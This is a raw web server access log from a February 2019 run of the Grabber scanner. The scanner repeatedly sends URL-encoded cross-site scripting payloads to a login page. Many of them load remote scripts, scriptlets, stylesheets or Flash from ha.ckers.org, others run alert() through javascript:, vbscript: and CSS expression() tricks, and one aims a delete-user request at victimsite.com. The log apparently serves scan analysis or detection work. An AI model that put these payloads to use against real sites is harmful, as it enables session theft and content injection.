172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B+xss%3A%26%23101%3Bx%26%23x2F%3B%2AXSS%2A%2F%2F%2A%2F%2A%2Fpression%28alert%28%22XSS%22%29%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%25BCscript%25BEalert%28%25A2XSS%25A2%29%25BC%2Fscript%25BE HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CIMG+STYLE%3D%22xss%3Aexpr%2F%2AXSS%2A%2Fession%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?Login=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CBR+SIZE%3D%22%26%7Balert%28%27XSS%27%29%7D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F0x42.0x0000066.0x7.0x93%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
